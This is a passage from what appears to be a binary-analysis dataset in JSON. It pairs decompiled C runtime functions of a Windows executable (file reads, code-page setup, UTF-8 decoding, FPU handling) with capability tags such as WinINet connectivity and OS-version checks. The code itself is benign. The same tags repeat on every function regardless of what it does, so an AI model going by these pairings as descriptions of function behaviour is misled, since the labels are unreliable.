uVar8 - 2;\n                                iVar7 = 2;\n                                *(var_10h + 0x2b + *(var_8h * 4 + 0x48fb00)) = 10;\n                                if (((var_1h == '\\x01') &&\n                                    (cVar1 = *(var_10h + 0x2c + *(var_8h * 4 + 0x48fb00)),  cVar1 != '\\n')) &&\n                                   (uVar6 != 0)) {\n                                    *pcVar5 = cVar1;\n                                    uVar6 = uVar8 - 3;\n                                    iVar7 = 3;\n                                    *(var_10h + 0x2c + *(var_8h * 4 + 0x48fb00)) = 10;\n                                    pcVar5 = lpBuffer + 3;\n                                }\n                            }\n                        }\n                        lpBuffer = pcVar5;\n                        var_20h = pcVar3;\n                        iVar4 = fcn.004206ab(arg_8h);\n                        pcVar3 = arg_8h_00;\n                        if (((iVar4 == 0) || (-1 < *(var_10h + 0x28 + *(var_8h * 4 + 0x48fb00)))) ||\n                           (iVar4 = (*_sym.imp.KERNEL32.dll_GetConsoleMode)(hConsoleHandle, &lpMode),  pcVar5 = lpBuffer\n                           ,  iVar4 == 0)) {\n                            var_1ch = var_1ch & 0xffffff00;\ncode_r0x00418e70:\n                            pcVar5 = lpBuffer;\n                            iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                              (hConsoleHandle, lpBuffer, uVar6, &lpNumberOfBytesRead, 0);\n                            if ((iVar4 == 0) || (uVar8 = lpNumberOfBytesRead,  arg_10h < lpNumberOfBytesRead)) {\n                                iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                if (iVar7 != 5) {\n                                    if (iVar7 == 0x6d) {\n                                        uVar8 = 0;\n                                        goto code_r0x00418e52;\n                                    }\n                                    goto code_r0x00418e48;\n                                }\n                                puVar2 = fcn.0040e0ee();\n                                *puVar2 = 9;\n                                puVar2 = fcn.0040e0db();\n                                *puVar2 = 5;\n                                goto code_r0x00418e4f;\n                            }\n                        }\n                        else {\n                            if (var_1h != '\\x02') goto code_r0x00418e70;\n                            iVar4 = (*_sym.imp.KERNEL32.dll_ReadConsoleW)\n                                              (hConsoleHandle, lpBuffer, uVar6 >> 1, &lpNumberOfBytesRead, 0);\n                            if (iVar4 == 0) {\n                                iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x00418e48:\n                                fcn.0040e094(iVar7);\n                                goto code_r0x00418e4f;\n                            }\n                            uVar8 = lpNumberOfBytesRead * 2;\n                        }\n                        uVar8 = iVar7 + uVar8;\n                        if (*(var_10h + 0x28 + *(var_8h * 4 + 0x48fb00)) < '\\0') {\n                            if (var_1h == '\\x02') {\n                                if (var_1ch == '\\0') {\n                                    uVar8 = fcn.0041870e(arg_8h, var_20h, uVar8 >> 1);\n                                }\n                                else {\n                                    uVar8 = fcn.00418a0d(arg_8h, var_20h, uVar8 >> 1);\n                                }\n                            }\n                            else {\n                                uVar8 = fcn.004188b6(arg_8h, pcVar5, uVar8, arg_ch, arg_10h >> 1);\n                            }\n                        }\n                    }\ncode_r0x00418e52:\n                    fcn.0041451c(arg_8h_00);\n                    return uVar8;\n                }\n            }\n            puVar2 = fcn.0040e0db();\n            *puVar2 = 0;\n            puVar2 = fcn.0040e0ee();\n            *puVar2 = 0x16;\n            goto code_r0x00418f2f;\n        }\n    }\n    puVar2 = fcn.0040e0db();\n    *puVar2 = 0;\n    puVar2 = fcn.0040e0ee();\n    *puVar2 = 9;\ncode_r0x00418f2f:\n    fcn.0040b81f();\n    return 0xffffffff;\n}\n",
        "token_count": 2351
    },
    "0041a93e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a93e(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_19h;\n    \n    if (*(unaff_EBP + -0x19) != '\\0') {\n        fcn.0040d717(3);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0041ad41": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ad41(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        piVar3 = arg_8h;\n        if (arg_10h != 0) {\n            do {\n                if (*piVar3 == 0) {\n                    arg_10h = arg_10h - piVar3;\n                    do {\n                        iVar1 = *(arg_10h + piVar3);\n                        *piVar3 = iVar1;\n                        piVar3 = piVar3 + 1;\n                        if (iVar1 == 0) {\n                            return 0;\n                        }\n                        arg_ch = arg_ch + -1;\n                    } while (arg_ch != 0);\n                    *arg_8h = 0;\n                    puVar2 = fcn.0040e0ee();\n                    uStack16 = 0x22;\n                    goto code_r0x0041acf1;\n                }\n                arg_ch = arg_ch + -1;\n                piVar3 = piVar3 + 1;\n            } while (arg_ch != 0);\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.0040e0ee();\n    uStack16 = 0x16;\ncode_r0x0041acf1:\n    *puVar2 = uStack16;\n    fcn.0040b81f();\n    return uStack16;\n}\n",
        "token_count": 363
    },
    "0041b8dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0041b8dc(uint param_1, char param_2, int32_t param_3, uint *param_4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint auStack584 [137];\n    uint *puStack36;\n    uint *puStack32;\n    int32_t iStack28;\n    uint *puStack20;\n    \n    fcn.0041ba31(param_3, param_4);\n    iStack28 = fcn.0041b65c(param_1);\n    if (iStack28 == *(*(param_3 + 0x48) + 4)) {\n        iVar2 = 0;\n    }\n    else {\n        puVar3 = fcn.00414556(0x220);\n        iVar2 = iStack28;\n        puStack20 = puVar3;\n        if (puVar3 == NULL) {\n            fcn.0041451c(0);\n            iVar2 = -1;\n        }\n        else {\n            puVar5 = *(param_3 + 0x48);\n            puVar6 = auStack584;\n            for (iVar4 = 0x88; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar5 = auStack584;\n            puVar6 = puVar3;\n            for (iVar4 = 0x88; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar3 = 0;\n            iVar2 = fcn.0041bb2c(iVar2, puVar3);\n            if (iVar2 == -1) {\n                puVar3 = fcn.0040e0ee();\n                *puVar3 = 0x16;\n                fcn.0041451c(puStack20);\n                iVar2 = -1;\n            }\n            else {\n                if (param_2 == '\\0') {\n                    fcn.00411489();\n                }\n                piVar1 = *(param_3 + 0x48);\n                LOCK();\n                iVar4 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                if ((iVar4 == 1) && (*(param_3 + 0x48) != 0x48e760)) {\n                    fcn.0041451c(*(param_3 + 0x48));\n                }\n                *puStack20 = 1;\n                *(param_3 + 0x48) = puStack20;\n                if ((*(param_3 + 0x350) & *0x48e4c0) == 0) {\n                    puStack36 = &param_3;\n                    puStack32 = &param_4;\n                    iStack28 = 5;\n                    puStack20 = 0x5;\n                    fcn.0041b54e(&puStack20, &puStack36);\n                    if (param_2 != '\\0') {\n                        *0x48e474 = *param_4;\n                    }\n                }\n                fcn.0041451c(0);\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 783
    },
    "0041bb2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0041bb2c(uint arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    ushort uVar2;\n    uint32_t arg_8h_00;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    ushort *puVar7;\n    uint8_t *puVar8;\n    ushort *puVar9;\n    uint unaff_EBX;\n    uint8_t *puVar10;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar11;\n    int32_t var_24h;\n    uint var_20h;\n    uint8_t *var_1ch;\n    int32_t lpCPInfo;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    arg_8h_00 = fcn.0041b65c(arg_8h);\n    if (arg_8h_00 != 0) {\n        uVar11 = 0;\n        uVar3 = 0;\n        var_1ch = NULL;\ncode_r0x0041bb63:\n        if (*(uVar3 + 0x48eb90) != arg_8h_00) goto code_r0x0041bb6f;\n        fcn.004085e0(arg_ch + 0x18, 0, 0x101);\n        var_24h = var_1ch * 0x30;\n        var_1ch = var_24h + 0x48eba0;\n        do {\n            uVar1 = *var_1ch;\n            puVar8 = var_1ch;\n            while ((uVar1 != 0 && (puVar8[1] != 0))) {\n                uVar3 = *puVar8;\n                if (uVar3 <= puVar8[1]) {\n                    puVar10 = arg_ch + 0x19 + uVar3;\n                    do {\n                        if (0xff < uVar3) break;\n                        *puVar10 = *puVar10 | *(uVar11 + 0x48eb88);\n                        uVar3 = uVar3 + 1;\n                        puVar10 = puVar10 + 1;\n                    } while (uVar3 <= puVar8[1]);\n                }\n                puVar8 = puVar8 + 2;\n                uVar1 = *puVar8;\n            }\n            uVar11 = uVar11 + 1;\n            var_1ch = var_1ch + 8;\n        } while (uVar11 < 4);\n        *(arg_ch + 4) = arg_8h_00;\n        *(arg_ch + 8) = 1;\n        uVar6 = fcn.0041b61e(arg_8h_00);\n        *(arg_ch + 0x21c) = uVar6;\n        puVar7 = arg_ch + 0xc;\n        puVar9 = var_24h + 0x48eb94;\n        iVar4 = 6;\n        do {\n            uVar2 = *puVar9;\n            puVar9 = puVar9 + 1;\n            *puVar7 = uVar2;\n            puVar7 = puVar7 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        goto code_r0x0041bbbf;\n    }\ncode_r0x0041bd1c:\n    fcn.0041b6cd(arg_ch);\ncode_r0x0041bd25:\n    fcn.00406dcc(var_24h);\n    return;\ncode_r0x0041bb6f:\n    var_1ch = var_1ch + 1;\n    uVar3 = uVar3 + 0x30;\n    if (0xef < uVar3) goto code_r0x0041bb7d;\n    goto code_r0x0041bb63;\ncode_r0x0041bb7d:\n    if ((arg_8h_00 == 65000) || (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h_00 & 0xffff),  iVar4 == 0))\n    goto code_r0x0041bd25;\n    if (arg_8h_00 == 0xfde9) {\n        *(arg_ch + 4) = 0xfde9;\n        *(arg_ch + 0x21c) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h_00, &lpCPInfo);\n        if (iVar4 == 0) {\n            if (*0x48fed0 == 0) goto code_r0x0041bd25;\n            goto code_r0x0041bd1c;\n        }\n        fcn.004085e0(arg_ch + 0x18, 0, 0x101);\n        *(arg_ch + 4) = arg_8h_00;\n        *(arg_ch + 0x21c) = 0;\n        if (lpCPInfo == 2) {\n            puVar5 = &var_12h;\n            while ((var_12h != 0 && (uVar1 = *(puVar5 + 1),  uVar1 != 0))) {\n                uVar3 = *puVar5;\n                if (uVar3 <= uVar1) {\n                    puVar8 = arg_ch + 0x19 + uVar3;\n                    iVar4 = (uVar1 - uVar3) + 1;\n                    do {\n                        *puVar8 = *puVar8 | 4;\n                        puVar8 = puVar8 + 1;\n                        iVar4 = iVar4 + -1;\n                    } while (iVar4 != 0);\n                }\n                puVar5 = puVar5 + 2;\n                var_12h._0_1_ = *puVar5;\n            }\n            puVar8 = arg_ch + 0x1a;\n            iVar4 = 0xfe;\n            do {\n                *puVar8 = *puVar8 | 8;\n                puVar8 = puVar8 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            uVar6 = fcn.0041b61e(*(arg_ch + 4));\n            *(arg_ch + 0x21c) = uVar6;\n            uVar11 = 1;\n        }\n    }\n    *(arg_ch + 8) = uVar11;\n    *(arg_ch + 0xc) = 0;\n    *(arg_ch + 0x10) = 0;\n    *(arg_ch + 0x14) = 0;\ncode_r0x0041bbbf:\n    fcn.0041b730(arg_ch, unaff_EDI, unaff_ESI, unaff_EBX, var_24h, arg_8h_00, var_1ch);\n    goto code_r0x0041bd25;\n}\n",
        "token_count": 1649
    },
    "0041bd34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041bd34(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.0040f75f(arg_8h);\n    if (((*(var_8h + 0x19 + (arg_ch & 0xff)) & arg_14h) == 0) &&\n       ((arg_10h == 0 || ((arg_10h & *(*var_ch + (arg_ch & 0xff) * 2)) == 0)))) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return uVar1;\n}\n",
        "token_count": 246
    },
    "0041edd3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0041edd3(char *arg_8h, char *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    \n    if (arg_18h == 0) {\n        return '4' < *arg_ch;\n    }\n    iVar1 = fcn.00419372();\n    if (iVar1 == 0) {\n        if (*arg_ch < '6') {\n            if (*arg_ch < '5') {\n                return false;\n            }\n            pcVar2 = arg_ch;\n            if (arg_14h != 0) {\n                do {\n                    pcVar2 = pcVar2 + 1;\n                } while (*pcVar2 == '0');\n                if (*pcVar2 == '\\0') {\n                    if (arg_ch == arg_8h) {\n                        return false;\n                    }\n                    return arg_ch[-1] & 1;\n                }\n            }\n        }\n    }\n    else if (iVar1 == 0x200) {\n        if ((*arg_ch == '0') || (arg_10h == 0x2d)) {\n            return false;\n        }\n    }\n    else {\n        if (iVar1 != 0x100) {\n            return false;\n        }\n        if (*arg_ch == '0') {\n            return false;\n        }\n        if (arg_10h != 0x2d) {\n            return false;\n        }\n    }\n    return true;\n}\n",
        "token_count": 337
    },
    "00420751": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420751(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if ((((arg_8h != 0) && (arg_8h != 0x400)) && (arg_8h != 0x800)) &&\n       (((arg_ch != 0 || (arg_10h < 1)) && (-1 < arg_10h)))) {\n        iVar5 = 0;\n        iVar4 = 0xe3;\n        do {\n            iVar3 = (iVar4 + iVar5) / 2;\n            iVar1 = *(iVar3 * 8 + 0x4292c8);\n            if (arg_8h == iVar1) {\n                if (iVar3 < 0) {\n                    return 0;\n                }\n                arg_8h_00 = *(iVar3 * 8 + 0x4292cc);\n                iVar4 = fcn.004102b3(arg_8h_00, 0x55);\n                if (0 < arg_10h) {\n                    if (arg_10h <= iVar4) {\n                        return 0;\n                    }\n                    iVar5 = fcn.00416c71(arg_ch, arg_10h, arg_8h_00);\n                    if (iVar5 != 0) {\n                        fcn.0040b84c(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        iVar4 = (*pcVar2)();\n                        return iVar4;\n                    }\n                }\n                return iVar4 + 1;\n            }\n            if (arg_8h - iVar1 < 0) {\n                iVar4 = iVar3 + -1;\n            }\n            else {\n                iVar5 = iVar3 + 1;\n            }\n        } while (iVar5 <= iVar4);\n    }\n    return 0;\n}\n",
        "token_count": 458
    },
    "00420da4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00420da4(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUStatusWord;\n    uint var_4h;\n    \n    uVar1 = in_FPUStatusWord;\n    uVar1 = ((in_FPUStatusWord >> 2 & 8 | uVar1 & 0x10) >> 2 | uVar1 & 8) >> 1 | ((uVar1 & 2) << 3 | uVar1 & 4) * 2 |\n            (uVar1 & 1) << 4;\n    if (*0x48f424 < 1) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = in_MXCSR & 0x3f;\n    }\n    uVar2 = ((uVar2 >> 2 & 8 | uVar2 & 0x10) >> 2 | uVar2 & 8) >> 1 | ((uVar2 & 2) << 3 | uVar2 & 4) * 2 |\n            (uVar2 & 1) << 4;\n    return (uVar2 << 8 | uVar1) << 0x10 | uVar2 | uVar1;\n}\n",
        "token_count": 295
    },
    "00420e4e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420e4e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint16_t in_FPUControlWord;\n    uint32_t var_20h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.00420c4c(arg_8h);\n    puVar2 = &var_20h;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_4h = var_4h & 7999;\n    var_20h = var_20h & 0xffff0000 | in_FPUControlWord & 0xffffe0c0 | var_4h;\n    fcn.00420b96(arg_8h);\n    return;\n}\n",
        "token_count": 208
    },
    "00420ec9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420ec9(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    puVar2 = &var_20h;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "004212d5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint16_t __cdecl fcn.004212d5(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == -1) {\n        return 0xffff;\n    }\n    fcn.0040f75f(arg_ch);\n    uVar2 = arg_8h;\n    if (*(var_10h + 8) == 0xfde9) {\n        if (arg_8h < 0x80) {\n            if ((*(\n                  L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                  + (arg_8h & 0xff)) & 1) != 0) {\n                uVar2 = *(*(var_10h + 0x94) + (arg_8h & 0xff));\n            }\n            arg_8h._0_2_ = uVar2;\n            goto code_r0x0042139b;\n        }\n        iVar1 = *(var_10h + 0xa8);\n    }\n    else {\n        if (arg_8h < 0x100) {\n            if ((*(\n                  L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                  + (arg_8h & 0xff)) & 1) == 0) {\n                arg_8h._0_2_ = arg_8h & 0xff;\n            }\n            else {\n                arg_8h._0_2_ = *(*(var_10h + 0x94) + (arg_8h & 0xff));\n            }\n            goto code_r0x0042139b;\n        }\n        iVar1 = *(var_10h + 0xa8);\n        if (iVar1 == 0) goto code_r0x0042139b;\n    }\n    iVar1 = fcn.00422444(iVar1, 0x100, &arg_8h, 1, &var_4h, 1);\n    arg_8h._0_2_ = var_4h;\n    if (iVar1 == 0) {\n    }\ncode_r0x0042139b:\n    if (var_8h != '\\0') {\n        *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n    }\n    return arg_8h;\n}\n",
        "token_count": 1219
    },
    "00422133": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl fcn.00422133(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint32_t *arg_14h, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint8_t *var_18h;\n    uint8_t var_11h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    if (arg_14h == NULL) {\n        arg_14h = 0x48fee4;\n    }\n    if (arg_ch == NULL) {\n        var_28h = NULL;\n        var_18h = 0x424248;\n        arg_10h = 1;\n    }\n    else {\n        var_18h = arg_ch;\n        var_28h = -(arg_ch != NULL) & arg_8h;\n        if (arg_10h == 0) goto code_r0x004222e2;\n    }\n    if (*(arg_14h + 6) == 0) {\n        uVar1 = *var_18h;\n        var_18h = var_18h + 1;\n        if (-1 < uVar1) {\n            if (var_28h != NULL) {\n                *var_28h = uVar1;\n            }\n            goto code_r0x004222e2;\n        }\n        if ((uVar1 & 0xe0) == 0xc0) {\n            uVar5 = CONCAT11(2, uVar1);\n        }\n        else if ((uVar1 & 0xf0) == 0xe0) {\n            uVar5 = CONCAT11(3, uVar1);\n        }\n        else {\n            if ((uVar1 & 0xf8) != 0xf0) goto code_r0x004222d7;\n            uVar5 = CONCAT11(4, uVar1);\n        }\n        uVar3 = uVar5 >> 8;\n        var_11h = uVar3;\n        uVar4 = (1 << (7 - uVar3 & 0x1f)) - 1U & uVar5 & 0xff;\ncode_r0x00422221:\n        uVar2 = uVar3;\n        if (uVar2 < arg_10h) {\n            arg_10h = uVar2;\n        }\n        uVar6 = var_18h - arg_ch;\n        while (uVar6 < arg_10h) {\n            uVar1 = *var_18h;\n            uVar5 = uVar5 & 0xffffff00;\n            uVar6 = uVar6 + 1;\n            var_18h = var_18h + 1;\n            if ((uVar1 & 0xc0) != 0x80) goto code_r0x004222d7;\n            uVar4 = uVar4 << 6 | uVar1 & 0x3f;\n        }\n        if (arg_10h < uVar2) {\n            *(arg_14h + 1) = uVar5 >> 8;\n            *arg_14h = uVar4;\n            *(arg_14h + 6) = uVar3 - arg_10h;\n            goto code_r0x004222e2;\n        }\n        if (((uVar4 < 0xd800) || (0xdfff < uVar4)) && (uVar4 < 0x110000)) {\n            var_10h = 0x80;\n            var_ch = 0x800;\n            var_8h = 0x10000;\n            if ((&var_18h)[uVar5 >> 8] <= uVar4) {\n                if (var_28h != NULL) {\n                    *var_28h = uVar4;\n                }\n                fcn.004220fd(-(uVar4 != 0) & uVar2, arg_14h);\n                goto code_r0x004222e2;\n            }\n        }\n    }\n    else {\n        uVar1 = *(arg_14h + 1);\n        uVar5 = uVar1 << 8;\n        uVar4 = *arg_14h;\n        uVar3 = *(arg_14h + 6);\n        if (((uVar1 - 2 < 3) && (uVar3 != 0)) && (uVar3 < uVar1)) goto code_r0x00422221;\n    }\ncode_r0x004222d7:\n    fcn.00422111(arg_14h, arg_18h);\ncode_r0x004222e2:\n    fcn.00406dcc(var_28h);\n    return;\n}\n",
        "token_count": 1142
    },
    "004222f1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
